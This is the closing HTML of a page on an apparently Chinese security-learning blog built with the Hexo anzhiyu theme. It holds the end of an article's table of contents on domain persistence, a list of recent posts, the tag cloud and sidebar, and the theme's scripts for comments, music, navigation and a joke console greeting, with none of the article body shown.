href="#%E5%85%B6%E4%BB%96%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF"><span class="toc-number">9.1.</span> <span class="toc-text">其他域权限维持技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%A8%81%E8%83%81%E7%9A%84%E6%8E%AA%E6%96%BD"><span class="toc-number">9.2.</span> <span class="toc-text">缓解域权限维持威胁的措施</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>